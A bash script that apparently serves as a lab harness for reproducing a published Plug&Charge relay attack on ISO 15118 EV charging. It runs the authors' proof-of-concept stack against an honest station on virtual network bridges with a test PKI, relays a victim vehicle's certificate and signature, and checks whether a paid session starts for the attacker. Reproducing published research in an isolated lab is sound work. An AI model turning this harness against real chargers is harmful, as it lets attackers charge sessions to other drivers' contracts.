#!/usr/bin/env bash
# 40-relay-attack-josev.sh - reproduce the Plug&Charge relay attack
# (arXiv:2512.15966, "Charge It to My Neighbor") exactly as published, using
# the authors' own PoC fork of the Josev (ex-SwitchEV, now EcoG) ISO 15118
# stack: github.com/securityinmobility/plug-and-charge-relay-poc
#
# Four processes on one host, two L2 segments (run 05-setup-veth.sh first):
#
#   br-pnc-a:  honest charging station (unmodified josev SECC)
#              attacker vehicle        (PoC-modified EVCC)
#   br-pnc-b:  fake charging station   (PoC-modified SECC, presents the
#                                        "compromised station" secc2 cert)
#              victim vehicle          (unmodified josev EVCC)
#
# The attacker pair relays, via files in a shared directory (as in the paper's
# PoC): victim contract cert -> attacker EVCC; honest station's GenChallenge ->
# victim EVCC (through the fake station); victim's signature -> attacker EVCC.
# Success criterion: the honest station accepts the relayed signature and the
# attacker vehicle proceeds to ChargeParameterDiscovery (a paid session).
#
# What this script does NOT need: real cars, chargers, PLC modems, or EVerest.
# Usage: ./40-relay-attack-josev.sh [WORKDIR]
set -euo pipefail

SCAFFOLD="$(cd "$(dirname "$0")/.." && pwd)"
WORK="${1:-$HOME/pnc-relay}"
TIMEOUT="${ATTACK_TIMEOUT:-90}"
POC_REF="master"       # PoC repo tip (attack patch = commit 1307d45)
JOSEV_COMMIT="676b315" # upstream josev v0.28.3 (the PoC's base)

mkdir -p "$WORK" && cd "$WORK"

echo "== 1/5 Cloning stacks"
[[ -d poc/.git ]]    || git clone https://github.com/securityinmobility/plug-and-charge-relay-poc.git poc
[[ -d honest/.git ]] || git clone https://github.com/EcoG-io/iso15118.git honest
git -C poc checkout -q "$POC_REF" 2>/dev/null || echo "WARN: staying on poc default branch"
git -C honest checkout -q "$JOSEV_COMMIT" 2>/dev/null || echo "WARN: upstream commit $JOSEV_COMMIT not found, staying on default branch"

echo "== 2/5 Python environments (one per stack, so 'import iso15118' is unambiguous)"
# Version pins taken from the PoC's poetry.lock (pip otherwise resolves
# incompatible marshmallow/pydantic majors) - verified 2026-11-22.
PINS='marshmallow==3.21.3 environs==9.5.0 pydantic==1.10.16 aiofile==3.8.8'
for SIDE in poc honest; do
  if [[ ! -d "venv-$SIDE" ]]; then
    python3 -m venv "venv-$SIDE"
    ./"venv-$SIDE"/bin/python -m ensurepip --upgrade >/dev/null 2>&1 || true
    ./"venv-$SIDE"/bin/pip install -q --upgrade pip
    ./"venv-$SIDE"/bin/pip install -q "./$SIDE"
    ./"venv-$SIDE"/bin/pip install -q $PINS
  fi
done

echo "== 3/5 Test PKI (with the scaffold's secc2LeafCert.cnf fix)"
# The PoC's create_certs.sh expects configs/secc2LeafCert.cnf but the repo
# never shipped it; the scaffold provides it. Without it the fake station has
# no TLS certificate and the attack cannot start.
cp "$SCAFFOLD/configs/secc2LeafCert.cnf" poc/iso15118/shared/pki/configs/
cp "$SCAFFOLD/configs/evcc_config_pnc.json" poc/evcc_config_pnc.json
cp "$SCAFFOLD/configs/evcc_config_pnc.json" honest/evcc_config_pnc.json
(cd poc/iso15118/shared/pki && ./create_certs.sh -v iso-2)
rm -rf honest/iso15118/shared/pki/iso15118_2
cp -r poc/iso15118/shared/pki/iso15118_2 honest/iso15118/shared/pki/
# Paper hygiene (optional): the fake-station side holds ONLY the compromised
# station's credentials (secc2) plus the V2G root. The PoC's security.py
# already points the SECC at secc2Leaf.key / cpo2CertChain.pem.

LOGS="$WORK/logs/$(date +%Y%m%d-%H%M%S)"
mkdir -p "$LOGS"
SHARED="$WORK/shared"   # relay backchannel dir (cert / challenge / signature)
rm -rf "$SHARED" && mkdir -p "$SHARED"

cleanup() { jobs -p | xargs -r kill 2>/dev/null || true; }
trap cleanup EXIT

echo "== 4/5 Launching the four participants (interfaces br-pnc-a / br-pnc-b)"
# PKI_PATH is exported per side because the four processes run the
# pip-installed package copy inside the venvs, whose default PKI_PATH points
# into site-packages where no certificates exist. Without it the honest SECC
# silently falls back to plain TCP and then refuses PNC (empty AuthOptionList
# crash). Each side must see its own stack's pki directory.
PKI_HONEST="$WORK/honest/iso15118/shared/pki"
PKI_POC="$WORK/poc/iso15118/shared/pki"
cd "$WORK/honest"
NETWORK_INTERFACE=br-pnc-a AUTH_MODES=PNC PKI_PATH="$PKI_HONEST" \
  "$WORK/venv-honest/bin/python" iso15118/secc/main.py > "$LOGS/secc-honest.log" 2>&1 &
cd "$SHARED"
NETWORK_INTERFACE=br-pnc-b AUTH_MODES=PNC PKI_PATH="$PKI_POC" \
  "$WORK/venv-poc/bin/python" -m iso15118.secc.main > "$LOGS/secc-fake.log" 2>&1 &
sleep 3   # let both stations come up and start answering SDP
cd "$WORK/honest"
NETWORK_INTERFACE=br-pnc-b EVCC_CONFIG_PATH="$WORK/honest/evcc_config_pnc.json" PKI_PATH="$PKI_HONEST" \
  "$WORK/venv-honest/bin/python" iso15118/evcc/main.py > "$LOGS/evcc-victim.log" 2>&1 &
cd "$SHARED"
NETWORK_INTERFACE=br-pnc-a EVCC_CONFIG_PATH="$WORK/poc/evcc_config_pnc.json" PKI_PATH="$PKI_POC" \
  "$WORK/venv-poc/bin/python" -m iso15118.evcc.main > "$LOGS/evcc-attacker.log" 2>&1 &

echo "== 5/5 Waiting up to ${TIMEOUT}s for the attack to complete"
for _ in $(seq "$TIMEOUT"); do
  if grep -q 'ChargeParameterDiscovery\|PowerDeliveryReq' "$LOGS/evcc-attacker.log" 2>/dev/null; then
    break
  fi
  sleep 1
done
sleep 2

echo
echo "===================== RESULT ====================="
if grep -q 'ChargeParameterDiscovery\|PowerDeliveryReq' "$LOGS/evcc-attacker.log" 2>/dev/null; then
  echo "ATTACK SUCCEEDED: the honest station accepted the victim's relayed"
  echo "signature and continued a paid session with the ATTACKER vehicle."
else
  echo "Attack did not complete within ${TIMEOUT}s - inspect logs in $LOGS"
fi
echo
echo "Evidence checklist (docs/measurement-plan.md):"
echo "  * victim cert left its session:   $SHARED/pnc-cert.pickle"
echo "  * honest station's challenge:     $SHARED/gen-challenge.bin"
echo "  * victim's signature:             $SHARED/pnc-signature.pickle"
echo "  * TLS keys for Wireshark:         $SHARED/ssl-keylog.txt"
echo "  * pcaps:                          run measurement/capture_traffic.sh on br-pnc-a/br-pnc-b"
echo "  * logs:                           $LOGS"
echo "Reference pcaps from the authors:   $WORK/poc/*.pcapng"
